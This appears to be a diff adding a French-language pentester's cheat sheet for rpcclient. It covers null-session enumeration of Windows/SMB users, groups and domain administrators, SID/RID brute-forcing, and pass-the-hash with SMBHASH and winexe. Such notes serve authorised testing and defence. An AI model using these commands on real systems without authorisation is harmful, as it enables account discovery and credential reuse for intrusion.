@@ -1,0 +1,80 @@
+# rpcclient
+
+## TNG
+rpcclient-tng -S 192.168.53.129 -U '%' # -p 445 if "something about rap failed"
+
+srvinfo wksinfo
+lsaquery
+enumdomains
+dominfo
+
+dispinfo
+enumusers
+
+lsaquery + lookupsids
+lsaenumsid + lookupsids
+
+enumgroups (-g|-m)
+samgroupmem "Admins du domaine" # ou "Domain Admins"
+samaliasmem BUILTIN\administrateurs
+svcenum OU service enum
+registry
+eventlog
+
+## SAMBA
+rpcclient -U '%' 192.168.53.129
+
+getusername
+
+srvinfo
+lsaquery
+dsroledominfo
+enumtrust
+querydominfo
+querydominfo 1
+querydominfo 12
+
+querydispinfo # liste detaillee mais partielle des utilisateurs
+enumdomusers # lister les utilisateurs locaux ou du domaine si DC
+
+lsaquery 5 + lookupsids 
+
+enumalsgroups builtin # lister les alias
+queryaliasmem builtin 0x220 # lister les membres de l'alias
+
+# si dans un domaine:
+enumdomgroups
+querygroupmem 0x200 # lister les admins du domaines
+
+## ASTUCES
+
+## pass the hash
+export SMBHASH="xxx:xxx"
+rpcclient -U "administrateur%'
+
+export SMBHASH=qqd3...:9eba...
+./winexe -U administrator //1.2.3.4 "cmd" # marche pas car winexe est 32bit
+
+# SID walkup (if we get STATUS_ACCESS_DENIED) (essayer d'abord avec TNG puis Samba)
+## TNG ou SAMBA
+dominfo (TNG) querydominfo (Samba) -> indique le nombre de users et de groups
+lsaenumsids -> liste des sid
+ou
+lsaquery (TNG) lsaquery 5 (samba) 
+lookupsid S-1-5-21-1715567821-1606980848-725345543-1003 -> puis essayer 1004, 1005, ...
+lookupsids ...
+
+https://github.com/trustedsec/ridenum
+impacket/examples/lookupsid.py
+
+# enumerer les membres du groupe BUILTIN\Administrateurs
+# en essayant les sids 1000, 1001, ...
+## SAMBA
+> queryuseraliases builtin S-1-5-21-1715567821-1606980848-725345543-1000 (500, 1001, ...)
+group rid:[0x220]
+> samlookuprids builtin 0x220
+rid 0x220: Administrateurs (4)
+
+## si la machine est dans un domaine, il faut preciser -W
+rpcclient -W SMA-LATESTWINXP -U 'seb%seb' 192.168.53.130
+
